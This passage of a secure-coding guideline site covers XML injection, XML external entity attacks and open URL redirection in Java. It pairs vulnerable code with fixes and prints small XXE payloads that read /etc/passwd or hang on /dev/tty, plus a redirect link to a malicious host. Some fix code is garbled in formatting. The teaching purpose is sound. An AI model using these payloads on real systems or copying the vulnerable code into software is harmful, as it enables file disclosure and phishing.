12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.BufferedOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.StringReader</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.XMLConstants</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.transform.stream.StreamSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.validation.Schema</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.validation.SchemaFactory</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.xml.sax.InputSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXParseException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.XMLReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OnlineStore</span> <span class="o">{</span>

  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">createXMLStream</span><span class="o">(</span><span class="kd">final</span> <span class="n">BufferedOutputStream</span> <span class="n">outStream</span><span class="o">,</span>
      <span class="kd">final</span> <span class="n">String</span> <span class="n">quantity</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">xmlString</span><span class="o">;</span>
    <span class="n">xmlString</span> <span class="o">=</span> <span class="s">"&lt;item&gt;\n&lt;description&gt;Widget&lt;/description&gt;\n"</span>
        <span class="o">+</span> <span class="s">"&lt;price&gt;500.0&lt;/price&gt;\n"</span> <span class="o">+</span> <span class="s">"&lt;quantity&gt;"</span> <span class="o">+</span> <span class="n">quantity</span>
        <span class="o">+</span> <span class="s">"&lt;/quantity&gt;&lt;/item&gt;"</span><span class="o">;</span>
    <span class="n">InputSource</span> <span class="n">xmlStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="k">new</span> <span class="n">StringReader</span><span class="o">(</span><span class="n">xmlString</span><span class="o">));</span>
    <span class="c1">// Build a validating SAX parser using our schema</span>
    <span class="n">SchemaFactory</span> <span class="n">sf</span> <span class="o">=</span> <span class="n">SchemaFactory</span>
        <span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">XMLConstants</span><span class="o">.</span><span class="na">W3C_XML_SCHEMA_NS_URI</span><span class="o">);</span>
    <span class="n">DefaultHandler</span> <span class="n">defHandler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DefaultHandler</span><span class="o">()</span> <span class="o">{</span>
      <span class="kd">public</span> <span class="kt">void</span> <span class="nf">warning</span><span class="o">(</span><span class="n">SAXParseException</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SAXParseException</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="n">s</span><span class="o">;</span>
      <span class="o">}</span>
      <span class="kd">public</span> <span class="kt">void</span> <span class="nf">error</span><span class="o">(</span><span class="n">SAXParseException</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SAXParseException</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="n">s</span><span class="o">;</span>
      <span class="o">}</span>
      <span class="kd">public</span> <span class="kt">void</span> <span class="nf">fatalError</span><span class="o">(</span><span class="n">SAXParseException</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SAXParseException</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="n">s</span><span class="o">;</span>
      <span class="o">}</span>
    <span class="o">};</span>
    <span class="n">StreamSource</span> <span class="n">ss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StreamSource</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"schema.xsd"</span><span class="o">));</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">Schema</span> <span class="n">schema</span> <span class="o">=</span> <span class="n">sf</span><span class="o">.</span><span class="na">newSchema</span><span class="o">(</span><span class="n">ss</span><span class="o">);</span>
      <span class="n">SAXParserFactory</span> <span class="n">spf</span> <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
      <span class="n">spf</span><span class="o">.</span><span class="na">setSchema</span><span class="o">(</span><span class="n">schema</span><span class="o">);</span>
      <span class="n">SAXParser</span> <span class="n">saxParser</span> <span class="o">=</span> <span class="n">spf</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">();</span>
      <span class="c1">// To set the custom entity resolver,</span>
      <span class="c1">// an XML reader needs to be created</span>
      <span class="n">XMLReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="n">saxParser</span><span class="o">.</span><span class="na">getXMLReader</span><span class="o">();</span>
      <span class="n">reader</span><span class="o">.</span><span class="na">setEntityResolver</span><span class="o">(</span><span class="k">new</span> <span class="n">CustomResolver</span><span class="o">());</span>
      <span class="n">saxParser</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">xmlStream</span><span class="o">,</span> <span class="n">defHandler</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ParserConfigurationException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">throw</span> <span class="k">new</span> <span class="n">IOException</span><span class="o">(</span><span class="s">"Unable to validate XML"</span><span class="o">,</span> <span class="n">x</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SAXException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">throw</span> <span class="k">new</span> <span class="n">IOException</span><span class="o">(</span><span class="s">"Invalid quantity"</span><span class="o">,</span> <span class="n">x</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="c1">// Our XML is valid, proceed</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">xmlString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS16-J.+Prevent+XML+Injection <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0090">XML External Entity Attacks</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 4 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example-1-checking-if-the-external-entity-is-safe-before-usage">Fixed code Example 1 : checking if the external entity is safe before usage</a></li>
<li><a href="#fixed-code-example-2-forbidding-the-use-of-external-entity">Fixed code Example 2 : forbidding the use of external entity</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>XML documents optionally contain a Document Type Definition (DTD), which, among other features, enables the definition of XML entities. It is possible to define an entity by providing a substitution string in the form of a URI. The XML parser can access the contents of this URI and embed these contents back into the XML document for further processing.</p>
<p>By submitting an XML file that defines an external entity with a file:// URI, an attacker can cause the processing application to read the contents of a local file. For example, a URI such as "file:///c:/winnt/win.ini" designates (in Windows) the file C:\Winnt\win.ini, or file:///etc/passwd designates the password file in Unix-based systems. Using URIs with other schemes such as http://, the attacker can force the application to make outgoing requests to servers that the attacker cannot reach directly, which can be used to bypass firewall restrictions or hide the source of attacks such as port scanning.</p>
<p>Once the content of the URI is read, it is fed back into the application that is processing the XML. This application may echo back the data (e.g. in an error message), thereby exposing the file contents. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>An XML external entity (XXE) attack occurs when XML input containing a reference to an external entity is processed by an improperly configured XML parser leading to problems such as the leaking of sensitive data or the crashing of the system.</p>
<p>An attacker might use an XXE attack to gain access to sensitive information by manipulating the URI of the entity to refer to files on the local file system containing sensitive data such as passwords and private user data. </p>
<p>An attacker might launch a denial-of-service attack, for example, by specifying /dev/random or /dev/tty as input URIs, which can crash or indefinitely block a program.</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Many XML parsers and validators can be configured to disable external entity expansion. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>This noncompliant code example attempts to parse the file evil.xml, report any errors, and exit. However, a malformed XML file may contain evil entity, leading to the vulnerability of the whole system.  </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="o">;</span>

<span class="kd">class</span> <span class="nc">XXE</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">receiveXMLStream</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">inStream</span><span class="o">,</span>
                                       <span class="n">DefaultHandler</span> <span class="n">defaultHandler</span><span class="o">)</span>
      <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">SAXParserFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
    <span class="n">SAXParser</span> <span class="n">saxParser</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">();</span>
    <span class="n">saxParser</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">inStream</span><span class="o">,</span> <span class="n">defaultHandler</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span>
      <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">receiveXMLStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"evil.xml"</span><span class="o">),</span> 
      <span class="k">new</span> <span class="n">DefaultHandler</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">MalformedURLException</span> <span class="n">mue</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Malformed URL Exception: "</span> <span class="o">+</span> <span class="n">mue</span><span class="o">);</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>This program is subject to a remote XXE attack if the evil.xml file contains the following:</p>
<p>(1) A SAX (Simple API for XML) or a DOM (Document Object Model) parser will attempt to access the URI specified by the SYSTEM attribute, which means it will attempt to read the contents of the local /dev/tty file. On POSIX systems, reading this file causes the program to block until input data is supplied to the machine's console. Consequently, an attacker can use this malicious XML file to cause the program to hang.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo SYSTEM "file:/dev/tty"&gt;</span>
<span class="nt">&lt;foo&gt;</span>bar<span class="nt">&lt;/foo&gt;</span>
</pre></div>
</td></tr></table>
<p>(2) A SAX (Simple API for XML) or a DOM (Document Object Model) parser will attempt to access system password file(/etc/passwd), leading to leaking of sensitive data.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">&lt;</span>?xml version="1.0" encoiding="utf-8"&gt;
<span class="cp">&lt;!DOCTYPE hack [</span>
<span class="cp">    &lt;!ENTITY % name SYSTEM "file:///etc/passwd"&gt;</span>
   %name; 
]&gt;
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example-1-checking-if-the-external-entity-is-safe-before-usage">Fixed code Example 1 : checking if the external entity is safe before usage</h3>
<p>This compliant solution defines a CustomResolver class that implements the interface org.xml.sax.EntityResolver. This interface enables a SAX application to customize handling of external entities. It is OK to customize a simple function judging if the entity path is safe and if the entity path is safe, it can be parsed while the resolveEntity() method returns an empty InputSource when an input fails to resolve to any of the specified, safe entity source paths.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.EntityResolver</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.InputSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>

<span class="kd">class</span> <span class="nc">CustomResolver</span> <span class="kd">implements</span> <span class="n">EntityResolver</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="n">InputSource</span> <span class="nf">resolveEntity</span><span class="o">(</span><span class="n">String</span> <span class="n">publicId</span><span class="o">,</span> <span class="n">String</span> <span class="n">systemId</span><span class="o">)</span>
      <span class="kd">throws</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>

    <span class="c1">// Check for known good entities</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">isSafe</span><span class="o">(</span><span class="n">publicId</span><span class="o">,</span> <span class="n">systemId</span><span class="o">))</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Resolving entity: "</span> <span class="o">+</span> <span class="n">publicId</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="n">systemId</span><span class="o">);</span>
      <span class="k">return</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="n">entityPath</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
      <span class="c1">// Disallow unknown entities by returning a blank path</span>
      <span class="k">return</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">();</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>The setEntityResolver() method registers the instance with the corresponding SAX driver. When parsing malicious input, the empty InputSource returned by the custom resolver causes a java.net.MalformedURLException to be thrown. Note that you must create an XMLReader object on which to set the custom entity resolver.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.xml.sax.InputSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.XMLReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="o">;</span>

<span class="kd">class</span> <span class="nc">XXE</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">receiveXMLStream</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">inStream</span><span class="o">,</span>
      <span class="n">DefaultHandler</span> <span class="n">defaultHandler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span>
      <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">SAXParserFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
    <span class="n">SAXParser</span> <span class="n">saxParser</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">();</span>

    <span class="c1">// Create an XML reader to set the entity resolver.</span>
    <span class="n">XMLReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="n">saxParser</span><span class="o">.</span><span class="na">getXMLReader</span><span class="o">();</span>
    <span class="n">reader</span><span class="o">.</span><span class="na">setEntityResolver</span><span class="o">(</span><span class="k">new</span> <span class="n">CustomResolver</span><span class="o">());</span>
    <span class="n">reader</span><span class="o">.</span><span class="na">setContentHandler</span><span class="o">(</span><span class="n">defaultHandler</span><span class="o">);</span>

    <span class="n">InputSource</span> <span class="n">is</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="n">inStream</span><span class="o">);</span>
    <span class="n">reader</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span>
      <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">receiveXMLStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"evil.xml"</span><span class="o">),</span> 
      <span class="k">new</span> <span class="n">DefaultHandler</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">MalformedURLException</span> <span class="n">mue</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Malformed URL Exception: "</span> <span class="o">+</span> <span class="n">mue</span><span class="o">);</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example-2-forbidding-the-use-of-external-entity">Fixed code Example 2 : forbidding the use of external entity</h3>
<p>class XXE {
  private static void receiveXMLStream(InputStream inStream, 
      DefaultHandler defaultHandler) throws ParserConfigurationException, 
      SAXException, IOException {
    SAXParserFactory factory = SAXParserFactory.newInstance();
    SAXParser saxParser = factory.newSAXParser();</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">//</span> <span class="nt">Create</span> <span class="nt">an</span> <span class="nt">XML</span> <span class="nt">reader</span> <span class="nt">to</span> <span class="nt">set</span> <span class="nt">the</span> <span class="nt">parameters</span><span class="o">.</span>
<span class="nt">XMLReader</span> <span class="nt">reader</span> <span class="o">=</span> <span class="nt">saxParser</span><span class="p">.</span><span class="nc">getXMLReader</span><span class="o">();</span>

<span class="o">//</span> <span class="nt">Disable</span> <span class="nt">external</span> <span class="nt">entity</span>
<span class="nt">reader</span><span class="p">.</span><span class="nc">setFeature</span><span class="o">(</span><span class="nt">http</span><span class="o">://</span><span class="nt">xml</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">sax</span><span class="o">/</span><span class="nt">features</span><span class="o">/</span><span class="nt">external-general-entities</span><span class="err">"</span><span class="o">,</span> <span class="nt">false</span><span class="o">);</span>
<span class="nt">reader</span><span class="p">.</span><span class="nc">setContentHandler</span><span class="o">(</span><span class="nt">defaultHandler</span><span class="o">);</span>

<span class="nt">InputSource</span> <span class="nt">is</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">InputSource</span><span class="o">(</span><span class="nt">inStream</span><span class="o">);</span>
<span class="nt">reader</span><span class="p">.</span><span class="nc">parse</span><span class="o">(</span><span class="nt">is</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>}</p>
<p>public static void main(String[] args) throws ParserConfigurationException,
      SAXException, IOException {
    try {
      receiveXMLStream(new FileInputStream("evil.xml"), 
      new DefaultHandler());
    } catch (java.net.MalformedURLException mue) {
      System.err.println("Malformed URL Exception: " + mue);
    }
  }
}
```</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/611.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-CERT">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS17-J.+Prevent+XML+External+Entity+Attacks.html <a class="footnote-backref" href="#fnref-CERT" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-611.html">CWE-611</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0091">URL Redirection to Untrusted Site</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1">Vulnerable code Example 1</a><ul>
<li><a href="#fixed-code-example-1">Fixed code Example 1</a></li>
</ul>
</li>
<li><a href="#vulnerable-code-example-2">Vulnerable code Example 2</a><ul>
<li><a href="#fixed-code-example-2">Fixed code Example 2</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Safe use of redirects and forwards can be done in a number of ways:  </p>
<ol>
<li>Simply avoid using redirects and forwards.  </li>
<li>If used, do not allow the url as user input for the destination. This can usually be done. In this case, you should have a method to validate URL.  </li>
<li>If user input can’t be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user.   </li>
<li>It is recommended that any such destination input be mapped to a value, rather than the actual URL or portion of the URL, and that server side code translate this value to the target URL.  </li>
<li>Sanitize input by creating a list of trusted URL's (lists of hosts or a regex).  </li>
<li>Force all redirects to first go through a page notifying users that they are going off of your site, and have them click a link to confirm.  </li>
</ol>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1">Vulnerable code Example 1</h3>
<p>The following Java code receives the URL from the 'url' GET parameter and redirects to that URL.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span> <span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"url"</span><span class="o">));</span>
</pre></div>
</td></tr></table>
<p>The code is vulnerable to an attack if no validation or extra method controls are applied to verify the certainty of the URL. This vulnerability could be used as part of a phishing scam by redirecting users to a malicious site. If no validation is applied, a malicious user could create a hyperlink to redirect your users to an unvalidated malicious website, for example:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span> http://example.com/example.php?url=http://malicious.example.com
</pre></div>
</td></tr></table>
<p>The user sees the link directing to the original trusted site (example.com) and does not realize the redirection that could take place </p>
<h4 id="fixed-code-example-1">Fixed code Example 1</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span>  <span class="n">string</span> <span class="n">redirect_url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"url"</span><span class="o">);</span>

  <span class="c1">// Check the safety of the URL</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">is_safe</span><span class="o">(</span><span class="n">redirect_url</span><span class="o">))</span> <span class="o">{</span>  
    <span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="n">redirect_url</span><span class="o">);</span>
  <span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-2">Vulnerable code Example 2</h3>
<p>When applications allow user input to forward requests between different parts of the site, the application must check that the user is authorized to access the url, perform the functions it provides, and it is an appropriate url request. If the application fails to perform these checks, an attacker crafted URL may pass the application’s access control check and then forward the attacker to an administrative function that is not normally permitted.</p>
<p>The following code is a Java servlet that will receive a GET request with a url parameter in the request to forward to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and complete the server-side forward processing before responding to the browser.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ForwardServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> 
<span class="o">{</span>
